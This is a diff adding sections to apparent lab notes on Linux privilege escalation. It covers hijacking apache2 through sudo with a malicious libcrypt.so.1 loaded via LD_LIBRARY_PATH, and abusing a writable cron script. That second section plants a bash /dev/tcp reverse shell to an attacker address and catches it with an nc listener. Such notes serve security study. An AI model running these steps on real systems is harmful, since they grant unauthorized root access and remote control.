@@ -381,3 +381,97 @@ sudo LD_PRELOAD=/tmp/preload.so program-name-here
 Replace `program-name-here` with the actual program name from your `sudo -l` output. This should allow you to escalate privileges and gain control over the target process.
 
 
+
+# 🧩 **LD_LIBRARY Exploit**
+
+
+
+
+##  **Run `ldd` to See Apache2 Shared Libraries**
+
+To check which shared libraries are used by Apache2, run the following command:
+
+```bash
+ldd /usr/sbin/apache2
+```
+
+This will list all the shared libraries that Apache2 relies on, including the paths to those libraries.
+
+---
+
+## ️ **Create a Malicious Shared Object (libcrypt.so.1)**
+
+From the libraries listed, let's create a malicious shared object with the same name as `libcrypt.so.1` using the provided exploit code `library_path.c`. 
+
+To compile the malicious shared object, run:
+
+```bash
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+```
+
+This command compiles the code and outputs a shared object called `libcrypt.so.1` into the `/tmp` directory.
+
+---
+
+##  **Run Apache2 with the `LD_LIBRARY_PATH` Exploit**
+
+Now, execute Apache2 using `sudo` while specifying the `LD_LIBRARY_PATH` environment variable to point to the directory where your malicious shared object (`/tmp`) is stored:
+
+```bash
+sudo LD_LIBRARY_PATH=/tmp apache2
+```
+
+By doing this, Apache2 will load your malicious shared object instead of the legitimate one, potentially allowing you to exploit the system.
+
+# 📄 cron jobs-file permission
+
+##  **Step 1: View the Contents of the System-Wide Crontab**
+
+Check the system-wide crontab to identify scheduled tasks:
+
+```bash
+cat /etc/crontab
+```
+
+This command displays the system's cron jobs, which can help you find automated tasks that may run `overwrite.sh`.
+
+---
+
+##  **Step 2: Locate the Full Path of the `overwrite.sh` File**
+
+To find the exact location of `overwrite.sh`, use:
+
+```bash
+locate overwrite.sh
+```
+
+This command will return the full path of the file so you can modify it.
+
+---
+
+## **Step 3: Edit the `overwrite.sh` File to Include a Reverse Shell**
+
+Edit the file to insert the following reverse shell code:
+
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/your-ip/listen-port 0>&1
+```
+
+Replace `your-ip` with your attacker's IP address and `listen-port` with the port you're listening on (e.g., `4444`).
+
+---
+
+## **Step 4: Set Up a Netcat Listener in Another Shell Tab**
+
+In a new terminal tab, set up a listener with Netcat to catch the reverse shell:
+
+```bash
+nc -nvlp 4444
+```
+
+This will open port `4444` and wait for incoming connections from the reverse shell.
+
+---
+
+Once the cron job runs the `overwrite.sh` script, it should execute the reverse shell, connecting back to your Netcat listener.
